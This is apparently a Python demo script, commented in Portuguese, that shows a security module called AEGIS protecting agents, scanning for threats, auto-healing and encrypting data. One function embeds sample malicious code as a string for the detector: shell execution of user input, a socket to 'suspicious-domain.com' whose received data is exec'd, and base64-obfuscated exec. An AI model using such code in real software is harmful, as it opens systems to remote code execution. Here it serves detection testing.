"""
AEGIS Demo Integration - Demonstração da Integração Real
========================================================

Demonstra a integração completa do sistema AEGIS com o projeto Quimera,
incluindo proteção de agentes, detecção de ameaças e resposta automática.
"""

import asyncio
import time
from datetime import datetime
from pathlib import Path
import sys

# Adicionar path do Quimera
sys.path.insert(0, str(Path(__file__).parent.parent))

from quimera.quadro_negro import QuadroNegro
from quimera.mab.mab import MultiArmedBandit
from quimera.agentes.agente_fiscal_codigo import AgenteFiscalCodigo
from quimera.core.plugin_framework import PluginManager
from quimera.logs.parser import montar_log

from .aegis_core import AegisCore
from .aegis_agent import AegisSecurityAgent
from .aegis_plugin import AegisSecurityPlugin


class QuimeraAegisDemo:
    """
    Demonstração completa da integração AEGIS + Quimera
    
    Esta classe demonstra:
    1. Inicialização do sistema AEGIS
    2. Integração com agentes Quimera existentes
    3. Proteção automática de componentes
    4. Detecção e resposta a ameaças
    5. Dashboard de segurança em tempo real
    """
    
    def __init__(self):
        self.quadro_negro = None
        self.mab = None
        self.plugin_manager = None
        self.aegis_agent = None
        self.aegis_plugin = None
        self.protected_agents = {}
        
    async def initialize_system(self):
        """Inicializa todo o sistema integrado"""
        print("🚀 Iniciando demonstração AEGIS + Quimera...")
        
        # 1. Inicializar componentes base do Quimera
        await self._initialize_quimera_base()
        
        # 2. Inicializar sistema AEGIS
        await self._initialize_aegis_system()
        
        # 3. Integrar AEGIS com Quimera
        await self._integrate_aegis_quimera()
        
        # 4. Configurar proteção automática
        await self._setup_automatic_protection()
        
        print("✅ Sistema AEGIS + Quimera inicializado com sucesso!")
    
    async def _initialize_quimera_base(self):
        """Inicializa componentes base do Quimera"""
        print("  📋 Inicializando Quadro Negro...")
        self.quadro_negro = QuadroNegro()
        
        print("  🎰 Inicializando Multi-Armed Bandit...")
        self.mab = MultiArmedBandit()
        
        print("  🔌 Inicializando Plugin Manager...")
        self.plugin_manager = PluginManager()
        self.plugin_manager.add_plugin_directory(str(Path(__file__).parent))
    
    async def _initialize_aegis_system(self):
        """Inicializa sistema AEGIS"""
        print("  🛡️ Inicializando AEGIS Security Core...")
        
        # Criar agente de segurança AEGIS
        self.aegis_agent = AegisSecurityAgent(
            id_registro="aegis_security_agent",
            nome_compativel="AEGIS Security Agent",
            quadro_negro=self.quadro_negro,
            mab_instance=self.mab
        )
        
        # Inicializar sistema de segurança
        success = await self.aegis_agent.initialize_security_system()
        if not success:
            raise RuntimeError("Falha ao inicializar sistema AEGIS")
        
        print("  🔧 Carregando plugin AEGIS...")
        # Carregar plugin AEGIS
        self.aegis_plugin = AegisSecurityPlugin(self.plugin_manager)
        success = await self.aegis_plugin.initialize()
        if not success:
            raise RuntimeError("Falha ao inicializar plugin AEGIS")
    
    async def _integrate_aegis_quimera(self):
        """Integra AEGIS com sistema Quimera"""
        print("  🔗 Integrando AEGIS com Quimera...")
        
        # Registrar plugin no manager
        await self.plugin_manager.load_plugin("quimera.aegis.aegis_plugin.AegisSecurityPlugin")
        
        # Configurar hooks de segurança
        await self._setup_security_hooks()
    
    async def _setup_automatic_protection(self):
        """Configura proteção automática"""
        print("  🔒 Configurando proteção automática...")
        
        # Proteger o próprio agente AEGIS (meta-proteção)
        aegis_reg_id = await self.aegis_agent.protect_agent(
            self.aegis_agent, "critical"
        )
        self.protected_agents["aegis_agent"] = aegis_reg_id
        
        print(f"    ✓ AEGIS Agent protegido (ID: {aegis_reg_id})")
    
    async def _setup_security_hooks(self):
        """Configura hooks de segurança"""
        # Configurar hooks para proteção automática de novos componentes
        pass
    
    async def demonstrate_agent_protection(self):
        """Demonstra proteção de agentes Quimera"""
        print("\n🔐 Demonstrando proteção de agentes...")
        
        # Criar agente fiscal de código para demonstração
        print("  📝 Criando Agente Fiscal de Código...")
        agente_fiscal = AgenteFiscalCodigo()
        
        # Proteger agente com AEGIS
        print("  🛡️ Aplicando proteção AEGIS...")
        fiscal_reg_id = await self.aegis_agent.protect_agent(
            agente_fiscal, "high"
        )
        self.protected_agents["agente_fiscal"] = fiscal_reg_id
        
        print(f"    ✓ Agente Fiscal protegido (ID: {fiscal_reg_id})")
        
        # Executar scan inicial
        print("  🔍 Executando scan inicial de segurança...")
        scan_report = await self.aegis_agent.aegis_core.scan_component(
            fiscal_reg_id, "full"
        )
        
        print(f"    ✓ Scan concluído: {len(scan_report.threats_detected)} ameaças detectadas")
        
        return agente_fiscal, fiscal_reg_id
    
    async def demonstrate_threat_detection(self):
        """Demonstra detecção de ameaças"""
        print("\n🔍 Demonstrando detecção de ameaças...")
        
        # Criar código malicioso simulado para teste
        malicious_code = """
        import os
        import subprocess
        
        # Código suspeito para demonstração
        def backdoor_function():
            command = input("Enter command: ")
            os.system(command)
            
        def suspicious_network():
            import socket
            s = socket.socket()
            s.connect(("suspicious-domain.com", 8080))
            data = s.recv(1024)
            exec(data.decode())
        
        # Base64 ofuscado suspeito
        import base64
        exec(base64.b64decode("cHJpbnQoJ0hVRUhVRUhVRScpIyBjb2RpZ28gb2Z1c2NhZG8="))
        """
        
        # Criar componente de teste com código malicioso
        class MaliciousComponent:
            def __init__(self):
                self.code = malicious_code
            
            def execute_suspicious_function(self):
                # Simula execução de função suspeita
                pass
        
        malicious_component = MaliciousComponent()
        
        # Proteger componente (irá detectar as ameaças)
        print("  🔍 Analisando componente suspeito...")
        mal_reg_id = await self.aegis_agent.protect_agent(
            malicious_component, "standard"
        )
        
        # Executar scan detalhado
        print("  🕵️ Executando scan profundo...")
        deep_scan_report = await self.aegis_agent.aegis_core.scan_component(
            mal_reg_id, "deep"
        )
        
        print(f"    🚨 {len(deep_scan_report.threats_detected)} ameaças detectadas!")
        
        # Listar ameaças detectadas
        for i, threat in enumerate(deep_scan_report.threats_detected, 1):
            print(f"      {i}. {threat.threat_type}: {threat.description}")
            print(f"         Nível: {threat.level.value}")
            print(f"         Fonte: {threat.source}")
        
        return malicious_component, mal_reg_id, deep_scan_report
    
    async def demonstrate_auto_healing(self):
        """Demonstra auto-healing"""
        print("\n🔧 Demonstrando auto-healing...")
        
        # Simular componente com problema de integridade
        class ComponentWithIssues:
            def __init__(self):
                self.data = "dados_originais"
                self.config = {"setting": "value"}
            
            def corrupt_data(self):
                # Simula corrupção de dados
                self.data = "dados_corrompidos"
                self.config = {"setting": "malicious_value"}
        
        component = ComponentWithIssues()
        
        # Proteger componente
        comp_reg_id = await self.aegis_agent.protect_agent(component, "high")
        
        # Scan inicial (baseline)
        initial_scan = await self.aegis_agent.aegis_core.scan_component(
            comp_reg_id, "standard"
        )
        print(f"  📊 Scan inicial: {len(initial_scan.threats_detected)} problemas")
        
        # Corromper dados
        print("  💥 Simulando corrupção de dados...")
        component.corrupt_data()
        
        # Scan pós-corrupção
        corruption_scan = await self.aegis_agent.aegis_core.scan_component(
            comp_reg_id, "standard"
        )
        print(f"  🚨 Pós-corrupção: {len(corruption_scan.threats_detected)} problemas detectados")
        
        # Tentar auto-healing
        if corruption_scan.threats_detected:
            print("  🔧 Tentando auto-healing...")
            for threat in corruption_scan.threats_detected:
                healing_result = await self.aegis_agent.aegis_core.auto_heal_component(
                    comp_reg_id, threat
                )
                if healing_result:
                    print(f"    ✅ Auto-healing bem-sucedido para: {threat.threat_type}")
                else:
                    print(f"    ❌ Auto-healing falhou para: {threat.threat_type}")
        
        return component, comp_reg_id
    
    async def demonstrate_encryption(self):
        """Demonstra funcionalidades de criptografia"""
        print("\n🔐 Demonstrando criptografia AEGIS...")
        
        # Dados sensíveis para criptografar
        sensitive_data = "Dados ultra-secretos do sistema Quimera - CONFIDENCIAL"
        
        # Gerar chave simétrica
        print("  🔑 Gerando chave simétrica...")
        key_id = await self.aegis_plugin.crypto_engine.generate_symmetric_key("AES-256-GCM")
        print(f"    ✓ Chave gerada: {key_id}")
        
        # Criptografar dados
        print("  🔒 Criptografando dados...")
        encrypted_package = await self.aegis_plugin.crypto_engine.encrypt_data(
            sensitive_data, key_id
        )
        print(f"    ✓ Dados criptografados ({len(encrypted_package['encrypted_data'])} bytes)")
        
        # Descriptografar dados
        print("  🔓 Descriptografando dados...")
        decrypted_data = await self.aegis_plugin.crypto_engine.decrypt_data(
            encrypted_package
        )
        decrypted_text = decrypted_data.decode('utf-8')
        print(f"    ✓ Dados descriptografados: {decrypted_text[:50]}...")
        
        # Verificar integridade
        integrity_ok = decrypted_text == sensitive_data
        print(f"    {'✅' if integrity_ok else '❌'} Integridade: {'OK' if integrity_ok else 'FALHOU'}")
        
        # Demonstrar hash
        print("  #️⃣ Gerando hash criptográfico...")
        hash_result = await self.aegis_plugin.crypto_engine.hash_data(
            sensitive_data, "SHA256"
        )
        print(f"    ✓ Hash SHA256: {hash_result['hash'][:32]}...")
        
        return encrypted_package, hash_result
    
    async def generate_security_dashboard(self):
        """Gera dashboard de segurança"""
        print("\n📊 Gerando Dashboard de Segurança...")
        
        # Obter dashboard do plugin AEGIS
        dashboard = await self.aegis_plugin.get_security_dashboard()
        
        print("="*80)
        print("                    AEGIS SECURITY DASHBOARD")
        print("="*80)
        print(f"Timestamp: {dashboard['timestamp']}")
        print(f"Sistema Ativo: {'✅' if dashboard['system_status']['active_monitoring'] else '❌'}")
        print(f"Saúde do Sistema: {dashboard['system_status']['overall_health']:.1%}")
        print(f"Componentes Protegidos: {dashboard['system_status']['components_protected']}")
        print(f"Nível de Ameaça: {dashboard['system_status']['threat_level'].upper()}")
        
        print("\n📈 MÉTRICAS DE PERFORMANCE:")
        perf = dashboard['performance_metrics']
        print(f"  Velocidade de Scan: {perf['scan_speed']:.3f}s")
        print(f"  Precisão de Detecção: {perf['detection_accuracy']:.1%}")
        print(f"  Tempo de Resposta: {perf['response_time']:.3f}s")
        
        print("\n🔍 MÉTRICAS DE COMPONENTES:")
        for comp_name, metrics in dashboard['component_metrics'].items():
            if metrics:
                print(f"  {comp_name.title()}:")
                for metric_name, value in metrics.items():
                    if isinstance(value, (int, float)):
                        print(f"    {metric_name}: {value}")
        
        print("\n📋 RECOMENDAÇÕES:")
        for i, rec in enumerate(dashboard['security_recommendations'], 1):
            print(f"  {i}. {rec}")
        
        print("="*80)
        
        return dashboard
    
    async def run_full_demonstration(self):
        """Executa demonstração completa"""
        try:
            start_time = time.time()
            
            # Inicializar sistema
            await self.initialize_system()
            
            # Demonstrações
            agente_fiscal, fiscal_id = await self.demonstrate_agent_protection()
            malicious_comp, mal_id, threats = await self.demonstrate_threat_detection()
            comp_issues, comp_id = await self.demonstrate_auto_healing()
            crypto_demo = await self.demonstrate_encryption()
            
            # Dashboard final
            dashboard = await self.generate_security_dashboard()
            
            # Estatísticas finais
            total_time = time.time() - start_time
            print(f"\n🎯 Demonstração concluída em {total_time:.2f} segundos")
            print(f"✅ Componentes protegidos: {len(self.protected_agents)}")
            print(f"🔍 Ameaças detectadas: {len(threats.threats_detected)}")
            print(f"🛡️ Sistema AEGIS operacional e protegendo o Quimera!")
            
            return True
            
        except Exception as e:
            print(f"❌ Erro durante demonstração: {e}")
            import traceback
            traceback.print_exc()
            return False


async def main():
    """Função principal da demonstração"""
    print("🌟 AEGIS SECURITY SYSTEM - DEMONSTRAÇÃO COMPLETA")
    print("🔗 Integração Real com Sistema Quimera")
    print("="*80)
    
    demo = QuimeraAegisDemo()
    success = await demo.run_full_demonstration()
    
    if success:
        print("\n🎉 Demonstração AEGIS concluída com sucesso!")
        print("🚀 Sistema pronto para uso em produção!")
    else:
        print("\n💥 Demonstração falhou - verificar logs de erro")
    
    return success


if __name__ == "__main__":
    # Executar demonstração
    asyncio.run(main())